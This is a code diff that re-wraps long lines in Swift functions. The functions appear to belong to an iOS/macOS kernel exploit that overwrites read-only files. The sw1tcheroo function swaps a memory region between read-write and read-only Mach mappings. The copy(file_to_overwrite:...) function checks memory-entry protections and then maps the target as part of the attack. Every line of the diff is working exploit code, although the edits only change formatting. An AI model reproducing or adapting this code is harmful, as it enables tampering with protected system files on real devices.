@@ -46,12 +46,15 @@ public func sw1tcheroo(pointer: UnsafeMutableRawPointer)  -> UnsafeMutableRawPoi
         }
         
         // change addr over to RW mapping
-        kernel_ret = vm_map(mach_task_self_, &(addr)!, obj_size!, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, rw_port!, 0, boolean_t(0), VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_DEFAULT);
+        kernel_ret = vm_map(mach_task_self_, &(addr)!, obj_size!, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+                            rw_port!, 0, boolean_t(0), VM_PROT_READ | VM_PROT_WRITE,
+                            VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_DEFAULT);
         print("[10] kr: \(kernel_ret), want 0")
         usleep(100)
         
         // change addr back to RO mapping
-        kernel_ret = vm_map(mach_task_self_, &(addr)!, obj_size!, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, ro_port!, 0, boolean_t(0), VM_PROT_READ, VM_PROT_READ, VM_INHERIT_DEFAULT);
+        kernel_ret = vm_map(mach_task_self_, &(addr)!, obj_size!, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+                            ro_port!, 0, boolean_t(0), VM_PROT_READ, VM_PROT_READ, VM_INHERIT_DEFAULT);
         print("[11] kr: \(kernel_ret), want 0")
         
         // unlock thread to stop changing mapping
@@ -133,7 +136,9 @@ public func copy(file_to_overwrite: CInt, file_offset: off_t, overwrite_data: Un
     
     // check that ro_addr was correctly protected as read-only by trying to get a read-write handle
     mo_size = memory_object_size_t(obj_size!)
-    kernel_ret = mach_make_memory_entry_64(mach_task_self_, &mo_size, memory_object_offset_t(ro_addr), MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE, &(ro_port)!, mem_entry_name_port_t(MACH_PORT_NULL));
+    kernel_ret = mach_make_memory_entry_64(mach_task_self_, &mo_size, memory_object_offset_t(ro_addr),
+                                           MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE, &(ro_port)!,
+                                           mem_entry_name_port_t(MACH_PORT_NULL));
     if (kernel_ret != KERN_PROTECTION_FAILURE) {
         log(str: "[*] failed RW handle check: \(kern_ret_str[Int(kernel_ret)])")
     }
@@ -141,7 +146,9 @@ public func copy(file_to_overwrite: CInt, file_offset: off_t, overwrite_data: Un
 
     // now that we know we cant get a read-write handle lets get a read-only one
     mo_size = memory_object_size_t(obj_size!)
-    kernel_ret = mach_make_memory_entry_64(mach_task_self_, &mo_size, memory_object_offset_t(ro_addr), MAP_MEM_VM_SHARE | VM_PROT_READ, &(ro_port)!, mem_entry_name_port_t(MACH_PORT_NULL));
+    kernel_ret = mach_make_memory_entry_64(mach_task_self_, &mo_size, memory_object_offset_t(ro_addr),
+                                           MAP_MEM_VM_SHARE | VM_PROT_READ, &(ro_port)!,
+                                           mem_entry_name_port_t(MACH_PORT_NULL));
     if (kernel_ret != KERN_SUCCESS) {
         log(str: "[*] failed to get RO handle: \(kern_ret_str[Int(kernel_ret)])")
     }
@@ -154,7 +161,8 @@ public func copy(file_to_overwrite: CInt, file_offset: off_t, overwrite_data: Un
 
     // check that we cant map our read-only handle as read-write by trying to map it into tmp_addr, if we cant map as read-write we will expect KERN_INVALID_RIGHT
     tmp_addr = 0
-    kernel_ret = vm_map(mach_task_self_, &tmp_addr, obj_size!, 0, VM_FLAGS_ANYWHERE, ro_port!, 0, boolean_t(0), VM_PROT_READ, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_DEFAULT)
+    kernel_ret = vm_map(mach_task_self_, &tmp_addr, obj_size!, 0, VM_FLAGS_ANYWHERE, ro_port!,
+                        0, boolean_t(0), VM_PROT_READ, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_DEFAULT)
     if (kernel_ret != KERN_INVALID_RIGHT) {
         log(str: "[*] failed RW handle check: \(kern_ret_str[Int(kernel_ret)])")
     }
@@ -162,7 +170,9 @@ public func copy(file_to_overwrite: CInt, file_offset: off_t, overwrite_data: Un
 
     // try mapping with our max prot as read-write, we will expect KERN_INVALID_RIGHT for the return
     tmp_addr = 0
-    kernel_ret = vm_map(mach_task_self_, &tmp_addr, obj_size!, 0, VM_FLAGS_ANYWHERE, ro_port!, 0, boolean_t(0), VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_DEFAULT)
+    kernel_ret = vm_map(mach_task_self_, &tmp_addr, obj_size!, 0, VM_FLAGS_ANYWHERE, ro_port!,
+                        0, boolean_t(0), VM_PROT_READ | VM_PROT_WRITE,
+                        VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_DEFAULT)
     if (kernel_ret != KERN_INVALID_RIGHT) {
         log(str: "[*] failed RW handle check: \(kern_ret_str[Int(kernel_ret)])")
     }
@@ -184,7 +194,9 @@ public func copy(file_to_overwrite: CInt, file_offset: off_t, overwrite_data: Un
 
     // get handle for read-write
     mo_size = memory_object_size_t(obj_size!)
-    kernel_ret = mach_make_memory_entry_64(mach_task_self_, &mo_size, memory_object_offset_t(tmp_addr), MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE, &(rw_port)!, mem_entry_name_port_t(MACH_PORT_NULL));
+    kernel_ret = mach_make_memory_entry_64(mach_task_self_, &mo_size, memory_object_offset_t(tmp_addr),
+                                           MAP_MEM_VM_SHARE | VM_PROT_READ | VM_PROT_WRITE, &(rw_port)!,
+                                           mem_entry_name_port_t(MACH_PORT_NULL));
     if (kernel_ret != KERN_SUCCESS) {
         log(str: "[*] failed to get of RW handle: \(kern_ret_str[Int(kernel_ret)])")
     }
@@ -245,7 +257,8 @@ public func copy(file_to_overwrite: CInt, file_offset: off_t, overwrite_data: Un
 
         // map our targer to read-only
         addr = addr_e2 + obj_size!
-        kernel_ret = vm_map(mach_task_self_, &(addr!), obj_size!, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, ro_port!, 0, boolean_t(0), VM_PROT_READ, VM_PROT_READ, VM_INHERIT_DEFAULT)
+        kernel_ret = vm_map(mach_task_self_, &(addr!), obj_size!, 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+                            ro_port!, 0, boolean_t(0), VM_PROT_READ, VM_PROT_READ, VM_INHERIT_DEFAULT)
         if (kernel_ret != KERN_SUCCESS) {
             log(str: "[*] failed to map RO target: \(kern_ret_str[Int(kernel_ret)])")
         }
